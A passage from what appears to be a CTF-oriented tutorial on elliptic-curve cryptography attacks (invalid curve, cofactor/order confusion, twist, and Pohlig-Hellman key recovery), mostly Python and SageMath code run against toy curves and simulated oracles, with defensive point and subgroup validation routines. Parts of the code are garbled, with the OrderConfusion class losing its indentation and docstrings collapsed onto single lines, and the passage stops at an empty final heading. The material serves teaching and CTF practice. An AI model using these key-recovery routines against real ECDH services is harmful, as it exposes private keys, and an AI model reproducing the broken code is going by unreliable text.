print(f"Curve order: {hex(n)}")

# Verify generator is on curve
print(f"G on curve: {curve.is_on_curve(G)}")

# Verify generator order
# [Note: Computing nG for large n is slow without optimization]
print(f"\n[Inference: nG should equal point at infinity for generator G of order n]")
```

**Tools and Libraries**

```bash
# Python cryptography libraries with ECC support

# Install common ECC libraries
pip3 install pycryptodome ecdsa sage tinyec

# SageMath (most powerful for ECC)
# Typically installed separately or via Docker
docker run -it sagemath/sagemath:latest

# Using ecdsa library
python3 << 'EOF'
from ecdsa import SECP256k1, SigningKey

# Generate key pair
sk = SigningKey.generate(curve=SECP256k1)
vk = sk.verifying_key

print(f"Private key: {sk.to_string().hex()}")
print(f"Public key: {vk.to_string().hex()}")

# Sign message
message = b"CTF flag"
signature = sk.sign(message)
print(f"Signature: {signature.hex()}")

# Verify
print(f"Valid: {vk.verify(signature, message)}")
EOF
```

---

### Invalid Curve Attacks

Invalid curve attacks exploit systems that don't validate if received points lie on the expected curve. Attacker sends points on different curves with weaker security properties.

**Attack Principle**

```python
# invalid_curve_attack.py
class InvalidCurveAttack:
    """
    Attack scenario:
    1. Server accepts point P without validation
    2. Attacker sends P on different curve with small order
    3. Server computes dP (where d is secret key)
    4. Attacker recovers d modulo small order
    5. Repeat with multiple small orders, use CRT to recover full d
    
    [Inference: Works when implementation doesn't check point validity]
    """
    
    def __init__(self, target_curve, target_p):
        self.target_curve = target_curve
        self.target_p = target_p
    
    def generate_invalid_curve(self, x_coord):
        """
        Generate curve passing through given x coordinate
        For y² = x³ + ax + b, fix a and solve for b
        """
        a = self.target_curve.a  # Keep same 'a' coefficient
        p = self.target_p
        
        # Choose arbitrary y value
        y = 1
        
        # Solve for b: b = y² - x³ - ax (mod p)
        b = (pow(y, 2, p) - pow(x_coord, 3, p) - a * x_coord) % p
        
        # Create invalid curve with different b
        invalid_curve = EllipticCurve(a, b, p)
        
        return invalid_curve, (x_coord, y)
    
    def find_small_order_point(self, target_x, max_attempts=1000):
        """
        Find point with small order on invalid curve
        
        Small orders make discrete log easy to solve
        """
        for attempt in range(max_attempts):
            invalid_curve, point = self.generate_invalid_curve(target_x + attempt)
            
            # Find point order
            order = self.compute_point_order(invalid_curve, point)
            
            # Look for small order (< 10000)
            if order and order < 10000:
                print(f"Found point with order {order}")
                print(f"Curve: y² = x³ + {invalid_curve.a}x + {invalid_curve.b} (mod {invalid_curve.p})")
                print(f"Point: {point}")
                return invalid_curve, point, order
        
        return None, None, None
    
    def compute_point_order(self, curve, point, max_order=100000):
        """Compute order of point (with reasonable limit)"""
        result = point
        order = 1
        
        while result is not None and order < max_order:
            result = curve.point_add(result, point)
            order += 1
        
        return order if result is None else None
    
    def recover_key_mod_order(self, oracle_response, point, order, curve):
        """
        Given oracle response dP, recover d (mod order) using baby-step giant-step
        
        oracle_response = dP (where d is secret key we want)
        """
        # Baby-step giant-step algorithm
        m = int(order**0.5) + 1
        
        # Baby steps: compute jP for j = 0, 1, ..., m-1
        baby_steps = {}
        current = None  # Point at infinity (0*P)
        
        for j in range(m):
            baby_steps[current] = j
            current = curve.point_add(current, point)
        
        # Giant steps: compute dP - i(mP) for i = 0, 1, ..., m-1
        mP = curve.scalar_mult(m, point)
        gamma = oracle_response
        
        for i in range(m):
            if gamma in baby_steps:
                j = baby_steps[gamma]
                d_mod_order = (i * m + j) % order
                return d_mod_order
            
            # Subtract mP
            gamma = curve.point_add(gamma, curve.point_negate(mP))
        
        return None

# Practical example
def invalid_curve_attack_demo():
    """
    Demonstrate invalid curve attack
    
    Assumes oracle accepts any point and returns d*P
    without validating P is on correct curve
    """
    # Target curve (simplified example)
    target_curve = EllipticCurve(a=2, b=3, p=97)
    secret_key = 42  # Secret we want to recover
    
    # Simulated vulnerable oracle
    def vulnerable_oracle(curve, point):
        """Returns d*P without validating curve"""
        if not curve.is_on_curve(point):
            # Vulnerable: doesn't check!
            pass
        return curve.scalar_mult(secret_key, point)
    
    attacker = InvalidCurveAttack(target_curve, 97)
    
    # Find invalid curve with small order point
    print("Searching for invalid curve with small order point...")
    invalid_curve, point, order = attacker.find_small_order_point(target_x=5)
    
    if point:
        print(f"\nAttacking with point of order {order}...")
        
        # Get oracle response
        response = vulnerable_oracle(invalid_curve, point)
        print(f"Oracle response: {response}")
        
        # Recover secret mod order
        d_mod_order = attacker.recover_key_mod_order(response, point, order, invalid_curve)
        print(f"\nRecovered: d ≡ {d_mod_order} (mod {order})")
        print(f"Actual secret: {secret_key}")
        print(f"Verification: {secret_key % order} == {d_mod_order}")

# Run demo
invalid_curve_attack_demo()
```

**Chinese Remainder Theorem (CRT) Recovery**

```python
# invalid_curve_crt.py
from math import gcd

def extended_gcd(a, b):
    """Extended Euclidean algorithm"""
    if a == 0:
        return b, 0, 1
    gcd_val, x1, y1 = extended_gcd(b % a, a)
    x = y1 - (b // a) * x1
    y = x1
    return gcd_val, x, y

def chinese_remainder_theorem(remainders, moduli):
    """
    Solve system of congruences:
    x ≡ r1 (mod m1)
    x ≡ r2 (mod m2)
    ...
    
    Returns (x, M) where x is solution and M = m1 * m2 * ...
    """
    if len(remainders) != len(moduli):
        raise ValueError("Lists must have same length")
    
    # Check moduli are pairwise coprime
    for i in range(len(moduli)):
        for j in range(i + 1, len(moduli)):
            if gcd(moduli[i], moduli[j]) != 1:
                print(f"[Inference: Moduli {moduli[i]} and {moduli[j]} not coprime]")
    
    # Compute solution
    M = 1
    for m in moduli:
        M *= m
    
    x = 0
    for r, m in zip(remainders, moduli):
        Mi = M // m
        _, inv, _ = extended_gcd(Mi, m)
        inv = inv % m
        x += r * Mi * inv
    
    return x % M, M

def full_invalid_curve_attack(oracle_func, target_curve, target_p, target_order):
    """
    Complete invalid curve attack using multiple small-order points
    
    Steps:
    1. Find multiple invalid curves with small-order points
    2. For each, recover d mod (small order)
    3. Use CRT to combine and recover full d
    """
    print("=== Full Invalid Curve Attack ===\n")
    
    remainders = []
    moduli = []
    recovered_bits = 0
    target_bits = target_order.bit_length()
    
    attacker = InvalidCurveAttack(target_curve, target_p)
    
    attempt_x = 5
    max_attempts = 100
    
    for attempt in range(max_attempts):
        # Find small order point
        invalid_curve, point, order = attacker.find_small_order_point(
            target_x=attempt_x + attempt
        )
        
        if not point:
            continue
        
        # Query oracle
        try:
            response = oracle_func(invalid_curve, point)
        except:
            print(f"Oracle rejected point (good validation!)")
            return None
        
        # Recover secret mod order
        d_mod = attacker.recover_key_mod_order(response, point, order, invalid_curve)
        
        if d_mod is not None:
            print(f"Recovered: d ≡ {d_mod} (mod {order})")
            remainders.append(d_mod)
            moduli.append(order)
            
            # Check if we have enough information
            product = 1
            for m in moduli:
                product *= m
            recovered_bits = product.bit_length()
            
            print(f"Progress: {recovered_bits}/{target_bits} bits recovered")
            print(f"Combined modulus: {product}\n")
            
            if recovered_bits >= target_bits:
                break
    
    # Use CRT to recover full secret
    if len(remainders) >= 2:
        secret, modulus = chinese_remainder_theorem(remainders, moduli)
        print(f"\n=== Attack Complete ===")
        print(f"Recovered secret (mod {modulus}): {secret}")
        return secret
    else:
        print("Insufficient data for CRT recovery")
        return None

# Example with multiple small orders
def demo_crt_recovery():
    """Demonstrate CRT-based secret recovery"""
    
    # Known values from multiple invalid curves
    remainders = [7, 13, 11]  # d mod various small orders
    moduli = [23, 29, 31]     # Small orders found
    
    print("Known congruences:")
    for r, m in zip(remainders, moduli):
        print(f"  d ≡ {r} (mod {m})")
    
    secret, combined_mod = chinese_remainder_theorem(remainders, moduli)
    
    print(f"\nCRT Solution:")
    print(f"d ≡ {secret} (mod {combined_mod})")
    
    # Verify
    for r, m in zip(remainders, moduli):
        print(f"Verify: {secret} mod {m} = {secret % m} (expected {r})")

demo_crt_recovery()
```

**Detecting and Preventing Invalid Curve Attacks**

```python
# invalid_curve_defense.py
def validate_point_on_curve(point, curve):
    """
    CRITICAL: Always validate received points
    
    Check:
    1. Point coordinates in valid range [0, p-1]
    2. Point satisfies curve equation
    3. Point has correct order (nP = O where n is curve order)
    """
    if point is None:
        return True  # Point at infinity is valid
    
    x, y = point
    p = curve.p
    
    # Check 1: Coordinate range
    if not (0 <= x < p and 0 <= y < p):
        print("INVALID: Coordinates out of range")
        return False
    
    # Check 2: Curve equation
    if not curve.is_on_curve(point):
        print("INVALID: Point not on curve")
        return False
    
    # Check 3: Point order (computationally expensive, optional)
    # Verify cofactor * point has correct order
    # [Inference: For prime-order curves, checking curve equation sufficient]
    
    print("VALID: Point passes all checks")
    return True

def secure_ecdh_implementation(my_private_key, their_public_key, curve, base_point, curve_order):
    """
    Secure ECDH implementation with validation
    
    Always validate received public keys before use
    """
    # CRITICAL: Validate received public key
    if not validate_point_on_curve(their_public_key, curve):
        raise ValueError("Invalid public key - possible attack!")
    
    # Verify point order (important for composite-order curves)
    # [Unverified: cofactor check implementation varies by curve]
    
    # Compute shared secret
    shared_secret = curve.scalar_mult(my_private_key, their_public_key)
    
    return shared_secret

# Example of vulnerable vs secure implementation
print("=== Vulnerable Implementation ===")
# Missing validation - accepts invalid curves
def vulnerable_ecdh(private_key, public_key, curve):
    return curve.scalar_mult(private_key, public_key)

print("\n=== Secure Implementation ===")
# Proper validation
curve = EllipticCurve(a=2, b=3, p=97)
my_key = 42
their_key = (17, 10)  # Should be validated

try:
    shared = secure_ecdh_implementation(my_key, their_key, curve, their_key, 100)
    print(f"Shared secret: {shared}")
except ValueError as e:
    print(f"Attack detected: {e}")
```

**CTF Scenarios**

```bash
# Common invalid curve attack patterns in CTF:

# 1. ECDH implementation without point validation
# 2. Custom ECC implementations (often vulnerable)
# 3. Side-channel oracles that reveal d*P for any P
# 4. Signature schemes accepting arbitrary points

# Tools for invalid curve attacks
pip3 install sage

# SageMath script for finding small-order points
sage << 'EOF'
p = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F
a = 0
K = GF(p)

# Try different b values to find curves with smooth order
for b_offset in range(1, 100):
    b = (7 + b_offset) % p
    try:
        E = EllipticCurve(K, [a, b])
        order = E.order()
        factors = factor(order)
        print(f"b={b}: order={order}")
        print(f"Factors: {factors}\n")
        
        # Look for smooth orders (many small factors)
        if max([f[0] for f in factors]) < 10000:
            print(f"Found smooth order curve at b={b}!")
            break
    except:
        pass
EOF
```

---

### Order Confusion

Order confusion attacks exploit mismatches between expected curve order, subgroup order, or point order. Common when cofactor > 1 or implementations assume prime-order groups.

**Cofactor and Subgroup Attacks**

```python
# order_confusion.py
class OrderConfusion:
    """
    Curve order n = h * q where:
    - n = total number of points on curve
    - q = large prime order of main subgroup
    - h = cofactor (small integer, often 1, 4, or 8)
    
    Prime-order curves: h = 1 (secp256k1, P-256)
    Composite-order curves: h > 1 (Curve25519 has h=8)
    
    Attack: Send point in small-order subgroup
    """
    
    def __init__(self, curve, generator, curve_order, cofactor):
        self.curve = curve
        self.generator = generator
        self.curve_order = curve_order
        self.cofactor = cofactor
        self.subgroup_order = curve_order // cofactor
    
    def find_small_subgroup_point(self):
        """
        Find point in small cofactor subgroup
        
        For curve with order n = h*q:
        - Points of order dividing h form small subgroup
        - Multiply any point by q to get small-order point
        """
        # Start with generator
        P = self.generator
        
        # Multiply by subgroup order to get cofactor-order point
        # [h*q]*P = O, so q*P has order dividing h
        small_point = self.curve.scalar_mult(self.subgroup_order, P)

    if small_point is None:
        print("Point at infinity (order 1)")
        return None
    
    # Verify point is in small subgroup
    order = self.find_point_order_dividing(small_point, self.cofactor)
    print(f"Found small subgroup point with order {order}")
    
    return small_point, order

def find_point_order_dividing(self, point, max_order):
    """Find order of point (assuming it divides max_order)"""
    result = point
    for order in range(1, max_order + 1):
        if result is None:
            return order
        result = self.curve.point_add(result, point)
    return None

def extract_key_bits_via_cofactor(self, oracle_func):
    """
    Extract low-order bits of private key
    
    If victim computes d*P where P has small order h:
    Result reveals d (mod h)
    """
    small_point, order = self.find_small_subgroup_point()
    
    if not small_point:
        print("No small subgroup found")
        return None
    
    # Send small-order point to oracle
    response = oracle_func(small_point)
    
    # Build lookup table for discrete log in small subgroup
    lookup = {}
    current = None  # Point at infinity
    
    for i in range(order):
        lookup[current] = i
        current = self.curve.point_add(current, small_point)
    
    # Find d mod order
    if response in lookup:
        d_mod_order = lookup[response]
        print(f"Recovered: d ≡ {d_mod_order} (mod {order})")
        return d_mod_order
    else:
        print("Response not in expected subgroup")
        return None

# Example: Curve25519 cofactor confusion
def curve25519_cofactor_example(): """ Curve25519: y² = x³ + 486662x² + x (mod 2^255 - 19) Montgomery form, cofactor h = 8

[Inference: Small subgroup of order 8 exists]
"""
print("=== Curve25519 Cofactor Attack ===\n")

# Simplified example (not actual Curve25519)
# Real attack requires Montgomery curve arithmetic

print("Curve25519 properties:")
print("- Cofactor: 8")
print("- Small subgroup order: 8")
print("- Main subgroup order: large prime q")
print("\nAttack: Send point of order 2, 4, or 8")
print("Result: Reveals d mod 8 (3 bits of private key)")

# Points of small order on Curve25519
small_order_points = {
    1: "Point at infinity",
    2: "(0, 0)",
    4: "(1, 0) and others",
    8: "Various points in cofactor subgroup"
}

print("\nSmall order points:")
for order, desc in small_order_points.items():
    print(f"  Order {order}: {desc}")

curve25519_cofactor_example()

# Weierstrass curve example with cofactor

def cofactor_attack_demo(): """ Demonstrate cofactor confusion attack """ # Create curve with composite order # Example: Small curve with cofactor > 1


# Simplified demonstration
curve = EllipticCurve(a=1, b=1, p=23)

# Find a generator (any point)
generator = (3, 10)  # Example point

# Count curve points (in practice, use Schoof's algorithm)
# Assume curve_order = 24 = 8 * 3 (cofactor h=8, q=3)
curve_order = 24
cofactor = 8

print(f"Curve order: {curve_order} = {cofactor} × {curve_order // cofactor}")

# Simulate oracle (victim's scalar multiplication)
secret_key = 19

def oracle(point):
    return curve.scalar_mult(secret_key, point)

# Attack
attacker = OrderConfusion(curve, generator, curve_order, cofactor)

print("\nFinding small subgroup point...")
small_point, order = attacker.find_small_subgroup_point()

if small_point:
    print(f"\nAttacking with point of order {order}...")
    d_mod = attacker.extract_key_bits_via_cofactor(oracle)
    
    if d_mod is not None:
        print(f"\n✓ Recovered {order.bit_length()} bits: d ≡ {d_mod} (mod {order})")
        print(f"  Actual: {secret_key} mod {order} = {secret_key % order}")

cofactor_attack_demo()
````

**Twist Curve Confusion**

```python
# twist_curve_confusion.py
def find_twist_curve(curve):
    """
    Quadratic twist: curve with same a but different b
    
    For curve E: y² = x³ + ax + b
    Twist E': y² = x³ + ax + b'
    
    Property: #E + #E' = 2p + 2 (over prime field Fp)
    If E has large prime order, E' often has smooth order
    """
    p = curve.p
    a = curve.a
    b = curve.b
    
    # Find non-square d in Fp
    d = 2
    while pow(d, (p - 1) // 2, p) == 1:
        d += 1
    
    # Twist curve: multiply b by non-square
    b_twist = (b * d) % p
    
    twist = EllipticCurve(a, b_twist, p)
    
    print(f"Original curve: y² = x³ + {a}x + {b} (mod {p})")
    print(f"Twist curve:    y² = x³ + {a}x + {b_twist} (mod {p})")
    
    return twist

def twist_attack_demo():
    """
    Twist attack: Send point on twist curve instead of original
    
    Similar to invalid curve attack but specifically using twist
    [Inference: Twist often has smoother order than original]
    """
    # Original curve
    curve = EllipticCurve(a=2, b=3, p=97)
    
    # Find twist
    twist = find_twist_curve(curve)
    
    print("\nTwist attack strategy:")
    print("1. Find twist curve (different b)")
    print("2. Find small-order point on twist")
    print("3. Send to victim if no validation")
    print("4. Recover d mod (small order)")
    print("5. Combine multiple twists with CRT")

twist_attack_demo()
````

**Subgroup Membership Testing**

```python
# subgroup_validation.py
def validate_subgroup_membership(point, curve, subgroup_order):
    """
    Verify point is in main subgroup of prime order q
    
    Method: Check that q*P = O (point at infinity)
    
    This prevents small subgroup attacks
    """
    if point is None:
        return True
    
    # Multiply by subgroup order
    result = curve.scalar_mult(subgroup_order, point)
    
    if result is None:
        print("✓ Point in main subgroup")
        return True
    else:
        print("✗ Point NOT in main subgroup (possible attack!)")
        print(f"  {subgroup_order}*P = {result} ≠ O")
        return False

def cofactor_clearing(point, curve, cofactor):
    """
    Clear cofactor by multiplying point by h
    
    For any point P, h*P is in main subgroup
    
    This is the standard defense for composite-order curves
    """
    if point is None:
        return None
    
    cleared_point = curve.scalar_mult(cofactor, point)
    
    print(f"Original point: {point}")
    print(f"After clearing (×{cofactor}): {cleared_point}")
    
    return cleared_point

# Example: Secure implementation with cofactor clearing
def secure_ecdh_with_cofactor_clearing(private_key, public_key, curve, cofactor, subgroup_order):
    """
    Secure ECDH on composite-order curve
    
    Steps:
    1. Validate point on curve
    2. Clear cofactor by multiplying by h
    3. Perform scalar multiplication
    """
    # Step 1: Validate
    if not curve.is_on_curve(public_key):
        raise ValueError("Point not on curve")
    
    # Step 2: Clear cofactor
    cleared_key = cofactor_clearing(public_key, curve, cofactor)
    
    if cleared_key is None:
        raise ValueError("Point in small subgroup (attack detected)")
    
    # Step 3: Scalar multiplication
    shared_secret = curve.scalar_mult(private_key, cleared_key)
    
    return shared_secret

# Demo
curve = EllipticCurve(a=2, b=3, p=97)
point = (17, 10)
subgroup_order = 50  # Example
cofactor = 2  # Example

print("=== Subgroup Validation ===")
validate_subgroup_membership(point, curve, subgroup_order)

print("\n=== Cofactor Clearing ===")
cleared = cofactor_clearing(point, curve, cofactor)
```

**CTF Patterns**

```python
# order_confusion_ctf.py
def identify_order_confusion_vulnerability(challenge_description):
    """
    Red flags indicating order confusion vulnerability:
    
    1. Custom ECC implementation
    2. Curve with cofactor > 1 mentioned
    3. No subgroup validation described
    4. Accepts arbitrary points
    5. Twist security not mentioned
    6. Montgomery/Edwards curves (often have cofactor)
    """
    red_flags = [
        "custom curve",
        "cofactor",
        "Curve25519",
        "Ed25519",
        "accepts any point",
        "no validation"
    ]
    
    for flag in red_flags:
        if flag.lower() in challenge_description.lower():
            print(f"⚠ Red flag: {flag}")
    
    print("\nAttack checklist:")
    print("☐ Find curve parameters (a, b, p, n, h)")
    print("☐ Identify cofactor h")
    print("☐ Find small subgroup points")
    print("☐ Test if oracle accepts off-curve points")
    print("☐ Extract d mod h for each small subgroup")
    print("☐ Use CRT to combine results")

# Common CTF scenario
def ctf_ecdh_oracle_attack():
    """
    Typical CTF challenge:
    - ECDH implementation provided
    - Oracle computes shared_secret = d*P for any P
    - No validation of P
    - Goal: Recover private key d
    """
    print("=== CTF ECDH Oracle Attack ===\n")
    
    print("Challenge setup:")
    print("- Server has private key d (unknown)")
    print("- You send point P")
    print("- Server returns d*P")
    print("- No point validation")
    
    print("\nExploitation steps:")
    print("1. Find curve order n = h*q")
    print("2. If h > 1:")
    print("   a. Send point of order h (or factor of h)")
    print("   b. Recover d mod h")
    print("3. If h = 1, try invalid curve attack:")
    print("   a. Generate invalid curves with smooth order")
    print("   b. Send points from invalid curves")
    print("   c. Recover d mod (smooth orders)")
    print("4. Use CRT to combine all d mod mi")
    print("5. If recovered bits < key size, repeat with more curves")

ctf_ecdh_oracle_attack()
```

**SageMath Attack Script**

```python
# order_confusion_sage.sage
"""
SageMath script for order confusion attacks

Usage: sage order_confusion_sage.sage
"""

def find_smooth_order_curves(base_a, base_b, p, num_curves=20):
    """
    Find curves with smooth orders (many small factors)
    """
    K = GF(p)
    smooth_curves = []
    
    print(f"Searching for smooth-order curves near y² = x³ + {base_a}x + {base_b}")
    
    for offset in range(-num_curves, num_curves):
        b = (base_b + offset) % p
        
        try:
            E = EllipticCurve(K, [base_a, b])
            order = E.order()
            factors = factor(order)
            
            # Check smoothness: all factors < 10^6
            max_factor = max([f[0] for f in factors])
            
            if max_factor < 10^6:
                smooth_curves.append({
                    'b': b,
                    'order': order,
                    'factors': factors,
                    'max_factor': max_factor
                })
                print(f"\n✓ Smooth curve found!")
                print(f"  b = {b}")
                print(f"  Order = {order}")
                print(f"  Factors = {factors}")
        except:
            pass
    
    return smooth_curves

def find_small_order_point(E, target_order):
    """
    Find point of specific order on curve E
    """
    n = E.order()
    
    if n % target_order != 0:
        return None
    
    cofactor = n // target_order
    
    # Find random point and multiply by cofactor
    for _ in range(100):
        P = E.random_point()
        Q = cofactor * P
        
        if Q != E(0) and target_order * Q == E(0):
            return Q
    
    return None

# Example usage (uncomment in SageMath):
"""
p = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F
a = 0
b = 7

smooth_curves = find_smooth_order_curves(a, b, p, num_curves=50)

for curve_info in smooth_curves[:5]:  # Top 5 smoothest
    print(f"\nCurve with b={curve_info['b']}")
    print(f"Order factors: {curve_info['factors']}")
    
    # Find small order points
    K = GF(p)
    E = EllipticCurve(K, [a, curve_info['b']])
    
    for factor, multiplicity in curve_info['factors']:
        if factor < 1000:  # Small factor
            P = find_small_order_point(E, factor)
            if P:
                print(f"  Point of order {factor}: {P}")
"""
```

---

### Pohlig-Hellman Attack

Pohlig-Hellman algorithm solves discrete log when group order has small prime factors. Reduces ECDLP on smooth-order groups to multiple smaller DLP problems.

**Algorithm Overview**

```python
# pohlig_hellman.py
class PohligHellman:
    """
    Pohlig-Hellman algorithm for ECDLP
    
    Given: Q = d*P on elliptic curve
    Find: d
    
    If curve order n = p1^e1 * p2^e2 * ... * pk^ek
    where pi are small primes:
    1. Solve d mod (pi^ei) for each i
    2. Use CRT to combine solutions
    
    Complexity: O(Σ ei(log n + √pi))
    [Inference: Efficient when largest prime factor is small]
    """
    
    def __init__(self, curve, generator, curve_order):
        self.curve = curve
        self.generator = generator
        self.curve_order = curve_order
    
    def factor_order(self, n=None):
        """
        Factor curve order into prime powers
        
        [Unverified: Factorization is hard for large n]
        In CTF, often given or n is smooth
        """
        if n is None:
            n = self.curve_order
        
        # Simple trial division for small factors
        factors = []
        d = 2
        
        while d * d <= n:
            exponent = 0
            while n % d == 0:
                exponent += 1
                n //= d
            
            if exponent > 0:
                factors.append((d, exponent))
            
            d += 1 if d == 2 else 2
        
        if n > 1:
            factors.append((n, 1))
        
        return factors
    
    def baby_step_giant_step(self, P, Q, order):
        """
        Solve Q = k*P for k, where k < order
        
        Baby-step giant-step algorithm:
        - Baby steps: Store j*P for j = 0..m
        - Giant steps: Compute Q - i*(m*P) and check lookup
        - m = ceil(√order)
        """
        import math
        
        m = int(math.ceil(math.sqrt(order)))
        
        # Baby steps: compute lookup table
        baby_steps = {}
        current = None  # Point at infinity
        
        for j in range(m + 1):
            baby_steps[current] = j
            current = self.curve.point_add(current, P)
        
        # Giant steps
        mP = self.curve.scalar_mult(m, P)
        gamma = Q
        
        for i in range(m + 1):
            if gamma in baby_steps:
                j = baby_steps[gamma]
                return i * m + j
            
            # Subtract m*P
            gamma = self.curve.point_add(gamma, self.curve.point_negate(mP))
        
        return None
    
    def solve_prime_power(self, P, Q, prime, exponent):
        """
        Solve Q = x*P where order of P is prime^exponent
        
        Uses successive reduction modulo increasing powers
        """
        n = self.curve_order
        
        # Base case: order is prime
        if exponent == 1:
            # Reduce problem to order prime
            cofactor = n // prime
            P_reduced = self.curve.scalar_mult(cofactor, P)
            Q_reduced = self.curve.scalar_mult(cofactor, Q)
            
            # Solve DLP in group of order prime
            x = self.baby_step_giant_step(P_reduced, Q_reduced, prime)
            return x
        
        # Recursive case: prime^exponent
        x = 0
        gamma = Q
        
        for k in range(exponent):
            # Reduce to order prime
            h_k = pow(prime, exponent - 1 - k)
            cofactor = n // pow(prime, k + 1)
            
            P_k = self.curve.scalar_mult(cofactor, P)
            gamma_k = self.curve.scalar_mult(cofactor, gamma)
            
            # Solve DLP
            d_k = self.baby_step_giant_step(P_k, gamma_k, prime)
            
            if d_k is None:
                return None
            
            # Update
            x += d_k * pow(prime, k)
            
            # Subtract d_k * prime^k * P from gamma
            subtract = self.curve.scalar_mult(d_k * pow(prime, k), P)
            gamma = self.curve.point_add(gamma, self.curve.point_negate(subtract))
        
        return x
    
    def solve(self, P, Q):
        """
        Main Pohlig-Hellman algorithm
        
        Solve Q = d*P by:
        1. Factor curve order n
        2. Solve d mod (p^e) for each prime power
        3. Combine with CRT
        """
        print("=== Pohlig-Hellman Attack ===\n")
        
        # Factor order
        factors = self.factor_order()
        print(f"Curve order factorization:")
        for prime, exp in factors:
            print(f"  {prime}^{exp}")
        
        # Check if attack is feasible
        max_prime = max(p for p, e in factors)
        print(f"\nLargest prime factor: {max_prime}")
        
        if max_prime > 10**10:
            print("[Inference: Large prime factor makes attack infeasible]")
            return None
        
        # Solve for each prime power
        remainders = []
        moduli = []
        
        for prime, exponent in factors:
            print(f"\nSolving mod {prime}^{exponent}...")
            
            x_mod = self.solve_prime_power(P, Q, prime, exponent)
            
            if x_mod is None:
                print(f"  Failed to solve mod {prime}^{exponent}")
                return None
            
            modulus = pow(prime, exponent)
            print(f"  d ≡ {x_mod} (mod {modulus})")
            
            remainders.append(x_mod)
            moduli.append(modulus)
        
        # Chinese Remainder Theorem
        print("\nCombining with CRT...")
        d, combined_mod = chinese_remainder_theorem(remainders, moduli)
        
        print(f"\n=== Solution ===")
        print(f"d ≡ {d} (mod {combined_mod})")
        
        # Verify
        result = self.curve.scalar_mult(d, P)
        if result == Q:
            print("✓ Verification successful!")
            return d
        else:
            print("✗ Verification failed")
            # Might need to add multiples of combined_mod
            print(f"[Inference: True d = {d} + k*{combined_mod} for some k]")
            return d

# Example usage
def pohlig_hellman_demo():
    """
    Demonstrate Pohlig-Hellman on small curve
    """
    # Small curve with smooth order
    curve = EllipticCurve(a=1, b=6, p=11)
    
    # Find generator
    P = (2, 4)  # Example point
    
    # Find curve order (small example)
    order = 13  # Assume we know this (in practice, use point counting)
    
    # Set up problem: Q = d*P
    secret_d = 7
    Q = curve.scalar_mult(secret_d, P)
    
    print(f"Problem: Find d such that Q = d*P")
    print(f"P = {P}")
    print(f"Q = {Q}")
    print(f"Curve order: {order}")
    print(f"Secret d (to recover): {secret_d}\n")
    
    # Attack
    attacker = PohligHellman(curve, P, order)
    recovered_d = attacker.solve(P, Q)
    
    if recovered_d:
        print(f"\n✓ Successfully recovered d = {recovered_d}")
        print(f"  (actual secret was {secret_d})")

pohlig_hellman_demo()
```

**Optimized Implementation with Precomputation**

```python
# pohlig_hellman_optimized.py
class OptimizedPohligHellman:
    """
    Optimized Pohlig-Hellman with precomputation
    
    Useful when solving multiple DLPs on same curve/generator
    """
    
    def __init__(self, curve, generator, curve_order):
        self.curve = curve
        self.generator = generator
        self.curve_order = curve_order
        self.factors = PohligHellman(curve, generator, curve_order).factor_order()
        
        # Precompute lookup tables for each prime
        self.precomputed_tables = {}
        self._precompute()
    
    def _precompute(self):
        """
        Precompute baby-step tables for each prime factor
        
        [Inference: Speeds up multiple DLP solutions on same curve]
        """
        print("Precomputing lookup tables...")
        
        for prime, exponent in self.factors:
            if prime > 10000:  # Skip very large primes
                continue
            
            # Compute reduced generator of order prime
            cofactor = self.curve_order // prime
            P_reduced = self.curve.scalar_mult(cofactor, self.generator)
            
            # Build baby-step table
            table = {}
            current = None
            
            for j in range(prime):
                table[current] = j
                current = self.curve.point_add(current, P_reduced)
            
            self.precomputed_tables[prime] = table
        
        print(f"Precomputed tables for {len(self.precomputed_tables)} primes")
    
    def solve_with_precomputation(self, Q):
        """
        Solve Q = d*P using precomputed tables
        """
        remainders = []
        moduli = []
        
        for prime, exponent in self.factors:
            if prime in self.precomputed_tables:
                # Use precomputed table
                cofactor = self.curve_order // prime
                Q_reduced = self.curve.scalar_mult(cofactor, Q)
                
                if Q_reduced in self.precomputed_tables[prime]:
                    d_mod = self.precomputed_tables[prime][Q_reduced]
                    
                    # Handle prime powers (simplified, exponent=1 case)
                    remainders.append(d_mod)
                    moduli.append(pow(prime, exponent))
            else:
                print(f"Prime {prime} too large for precomputation")
                return None
        
        # CRT
        d, _ = chinese_remainder_theorem(remainders, moduli)
        return d
```

**Attack Feasibility Analysis**

```python
# pohlig_hellman_feasibility.py
def analyze_pohlig_hellman_feasibility(curve_order):
    """
    Determine if Pohlig-Hellman attack is feasible
    
    Feasibility depends on largest prime factor
    """
    import math
    
    print(f"Analyzing curve order: {curve_order}")
    print(f"Bit length: {curve_order.bit_length()} bits\n")
    
    # Factor (using trial division for demo)
    ph = PohligHellman(None, None, curve_order)
    factors = ph.factor_order(curve_order)
    
    print("Prime factorization:")
    total_bits_recovered = 0
    
    for prime, exp in factors:
        modulus = pow(prime, exp)
        bits = modulus.bit_length()
        total_bits_recovered += bits
        
        print(f"  {prime}^{exp} ({bits} bits)")
        
        # Estimate complexity
        if prime < 10**6:
            status = "✓ Trivial"
        elif prime < 10**12:
            status = "✓ Feasible (baby-step giant-step)"
        elif prime < 10**20:
            status = "⚠ Difficult (requires optimization)"
        else:
            status = "✗ Infeasible (too large)"
        
        print(f"    Complexity: ~√{prime} = ~2^{math.log2(prime)/2:.1f}")
        print(f"    Status: {status}")
    
    print(f"\nTotal recoverable bits: {total_bits_recovered}/{curve_order.bit_length()}")
    
    # Overall assessment
    largest_prime = max(p for p, e in factors)
    
    if largest_prime < 10**12:
        print("\n✓ VULNERABLE: Pohlig-Hellman attack feasible")
        print(f"  Largest prime {largest_prime} is small enough")
    elif total_bits_recovered >= curve_order.bit_length() * 0.9:
        print("\n⚠ PARTIALLY VULNERABLE: Most bits recoverable")
        print(f"  Can recover {total_bits_recovered} bits, may enable further attacks")
    else:
        print("\n✓ SECURE: Pohlig-Hellman attack infeasible")
        print(f"  Largest prime {largest_prime} too large")

# Examples
print("=== Example 1: Smooth Order (Vulnerable) ===\n")
smooth_order = 2**10 * 3**5 * 5**3 * 7**2
analyze_pohlig_hellman_feasibility(smooth_order)

print("\n" + "="*50 + "\n")
print("=== Example 2: Prime Order (Secure) ===\n")
prime_order = 2**256 - 2**32 - 977  # Near secp256k1 order
analyze_pohlig_hellman_feasibility(prime_order)
```

**CTF Exploitation Script**

```python
# pohlig_hellman_ctf.py
